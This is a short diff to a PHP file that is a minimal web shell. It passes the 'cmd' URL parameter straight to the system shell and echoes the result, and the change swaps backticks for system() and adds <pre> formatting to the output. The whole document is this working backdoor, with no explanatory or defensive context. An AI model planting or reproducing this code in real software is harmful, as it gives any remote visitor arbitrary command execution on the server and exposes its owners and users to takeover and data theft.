@@ -1,3 +1,5 @@
+<pre>
 <?PHP
-echo `$_GET['cmd']`
+echo system($_GET['cmd']);
 ?>
+</pre>
